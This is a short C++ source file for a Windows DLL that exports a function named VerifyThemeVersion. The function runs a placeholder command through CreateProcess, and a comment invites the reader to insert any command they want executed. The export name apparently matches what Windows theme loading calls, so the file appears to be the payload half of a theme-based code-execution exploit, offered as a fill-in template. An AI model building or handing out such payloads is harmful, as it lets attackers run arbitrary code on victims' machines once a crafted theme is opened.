#include <windows.h>

extern "C" __declspec(dllexport) void VerifyThemeVersion(void)
{
    // Replace this with the command you want to execute
    const char* command = "[command]";

    // Execute the command using the Windows API
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    if (CreateProcess(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
